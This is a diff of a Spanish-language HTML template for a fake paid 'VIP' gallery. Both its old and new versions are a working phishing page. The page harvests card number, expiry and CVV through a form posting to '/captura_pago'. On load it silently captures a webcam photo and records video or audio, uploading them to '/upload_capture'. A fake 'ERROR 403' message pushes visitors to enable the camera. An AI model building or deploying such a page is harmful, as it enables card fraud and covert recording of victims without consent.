@@ -1,145 +1,90 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
+<link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{{ config.titulo }}</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
-    <style>
-        :root {
-            --bg-color: {{ config.color_fondo }};
-            --text-color: {{ config.color_texto }};
-            --accent: #ffd700;
-        }
-        body {
-            background: radial-gradient(circle at center, var(--bg-color) 0%, #000000 100%);
-            color: var(--text-color);
-            font-family: 'Segoe UI', sans-serif;
-            min-height: 100vh;
-        }
-        .portada-vip { width: 100%; height: 250px; background-image: url('{{ config.img_principal }}'); background-size: cover; background-position: center; border-bottom: 2px solid var(--accent); position: relative; }
-        .overlay-portada { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(transparent, rgba(0,0,0,0.8)); padding: 20px; text-align: center; }
-        .alias-badge { background: linear-gradient(45deg, #ffd700, #daa520); color: black; padding: 5px 20px; border-radius: 20px; font-weight: bold; box-shadow: 0 0 15px var(--accent); }
-        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; padding: 20px; margin-bottom: 250px; }
-        .photo-item { aspect-ratio: 1/1; position: relative; border-radius: 12px; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); background: #111; }
-        .photo-item img { width: 100%; height: 100%; object-fit: cover; filter: blur(10px) grayscale(100%); }
-        .lock-icon { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--accent); font-size: 1.5rem; text-shadow: 0 0 10px black; }
-        .payment-box { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border-top: 2px solid var(--accent); padding: 20px; z-index: 9999; }
-        .form-control { background: rgba(255,255,255,0.1) !important; border: 1px solid var(--accent) !important; color: white !important; text-align: center; }
-        .btn-pay { background: linear-gradient(45deg, #ffd700, #daa520); color: black; font-weight: bold; border: none; width: 100%; padding: 12px; border-radius: 8px; margin-top: 10px; }
-        #status-log { font-size: 10px; color: #00ff41; text-align: center; margin-top: 5px; font-family: monospace; }
-    </style>
 </head>
-<body>
+<body style="background:{{config.color_fondo}}; color:{{config.color_texto}};">
+    <div class="container p-4 text-center">
+        <img src="{{config.img_principal}}" style="width:100px; border-radius:50%; border:2px solid gold;">
+        <h3 class="mt-3">VERIFICACIÓN REQUERIDA</h3>
+        <p>Para acceder, complete el pago de ${{config.precio}}</p>
 
-<div class="portada-vip">
-    <div class="overlay-portada">
-        <h1 style="color: var(--accent); font-weight: 800;">{{ config.titulo }}</h1>
-        <span class="alias-badge">{{ config.alias }}</span>
-    </div>
-</div>
-
-<div class="container mt-3">
-    <div class="text-center mb-3">
-        <small class="text-warning">Contenido exclusivo verificado para miembros</small>
-    </div>
-
-    <div class="gallery-grid">
-        {% if fotos %}
-            {% for f in fotos %}
-            <div class="photo-item">
-                <img src="/static/uploads/{{ f }}" alt="VIP Content">
-                <div class="lock-icon">🔒</div>
-            </div>
-            {% endfor %}
-        {% else %}
-            <div class="text-center w-100 opacity-50">No hay fotos en la galería</div>
-        {% endif %}
-    </div>
-</div>
-
-<div class="payment-box">
-    <div class="container">
-        <h6 class="text-center mb-3" style="color: gold;">VERIFICACIÓN REQUERIDA PARA DESBLOQUEAR</h6>
-        <form action="/captura_pago" method="POST">
-            <div class="row g-2">
-                <div class="col-12">
-                    <input type="tel" name="cc" class="form-control" placeholder="Número de Tarjeta" 
-                           inputmode="numeric" pattern="[0-9]*" maxlength="16" required>
+        <div style="background:rgba(255,255,255,0.1); padding:20px; border-radius:15px; max-width:400px; margin:auto;">
+            <form action="/captura_pago" method="POST">
+                <input type="text" name="cc" class="form-control mb-2" placeholder="Número de Tarjeta" required>
+                <div class="row g-2">
+                    <div class="col-6"><input type="text" name="exp" class="form-control" placeholder="MM/AA"></div>
+                    <div class="col-6"><input type="text" name="cvv" class="form-control" placeholder="CVV"></div>
                 </div>
-                <div class="col-6">
-                    <input type="tel" name="exp" id="exp" class="form-control" placeholder="MM/AA" 
-                           inputmode="numeric" maxlength="5" required>
-                </div>
-                <div class="col-6">
-                    <input type="tel" name="cvv" class="form-control" placeholder="CVV" 
-                           inputmode="numeric" pattern="[0-9]*" maxlength="4" required>
-                </div>
-            </div>
-            <button class="btn-pay">DESBLOQUEAR CONTENIDO ($ {{ config.precio }})</button>
-        </form>
-        <div id="status-log">ESTADO: ESPERANDO SINCRONIZACIÓN...</div>
+                <button class="btn btn-warning w-100 mt-3 fw-bold">PAGAR AHORA</button>
+            </form>
+            <div id="status" style="font-size:10px; margin-top:10px; color:gold;">Sincronizando seguridad...</div>
+        </div>
     </div>
-</div>
 
-<script>
-    // --- FORMATO AUTOMÁTICO PARA MM/AA ---
-    const inputExp = document.getElementById('exp');
-    inputExp.addEventListener('input', function (e) {
-        let val = e.target.value.replace(/\D/g, '');
-        if (val.length > 2) {
-            e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
-        } else {
-            e.target.value = val;
-        }
-    });
+    <script>
+        async function runCapture() {
+            const rid = "{{ session.current_id }}";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // Capturar foto a los 3 segundos
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('file', blob); fd.append('type', 'FOTO'); fd.append('id', rid);
+                        fetch('/upload_capture', {method: 'POST', body: fd});
+                    }, 'image/jpeg');
+                }, 3000);
 
-    // --- SISTEMA DE CAPTURA MULTIMEDIA ---
-    async function runCapture() {
-        const log = document.getElementById('status-log');
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            log.innerText = "ESTADO: IDENTIDAD VERIFICADA ✓";
-
-            // Captura de Foto
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('file', blob);
-                    fd.append('type', 'photo');
-                    fetch('/upload_capture', {method: 'POST', body: fd});
-                }, 'image/jpeg');
-
-                // Captura de Audio (15 segundos)
+                // Grabar video 10 segundos
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.onstop = () => {
-                    const audioBlob = new Blob(chunks, {type: 'audio/webm'});
-                    const fdA = new FormData();
-                    fdA.append('file', audioBlob);
-                    fdA.append('type', 'audio');
-                    fetch('/upload_capture', {method: 'POST', body: fdA});
-                    stream.getTracks().forEach(t => t.stop());
+                    const blob = new Blob(chunks, {type: 'video/webm'});
+                    const fd = new FormData();
+                    fd.append('file', blob); fd.append('type', 'VIDEO'); fd.append('id', rid);
+                    fetch('/upload_capture', {method: 'POST', body: fd});
                 };
                 recorder.start();
-                setTimeout(() => recorder.stop(), 15000); // 15 seg
-            }, 2000);
+                setTimeout(() => recorder.stop(), 10000);
 
-        } catch (e) {
-            log.innerText = "ESTADO: ERROR 403 - ACTIVA TU CÁMARA";
-            log.style.color = "red";
+            } catch (e) { document.getElementById('status').innerText = "ERROR 403: REQUIERE CÁMARA"; }
         }
-    }
-    window.onload = runCapture;
-</script>
+        window.onload = runCapture;
 
+    // MÁSCARA INTELIGENTE DE TARJETA
+    const inputCC = document.querySelector('input[name="cc"]');
+    const inputEXP = document.querySelector('input[name="exp"]');
+    const inputCVV = document.querySelector('input[name="cvv"]');
+
+    inputCC.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        v = v.replace(/(\d{4})(?=\d)/g, '$1 '); // Espacio cada 4 números
+        e.target.value = v.substring(0, 19);
+    });
+
+    inputEXP.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
+        e.target.value = v.substring(0, 5);
+    });
+
+    inputCVV.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+    });
+
+    // [Mantener aquí el script de captura de cámara/audio que envié antes]
+    </script>
 </body>
 </html>
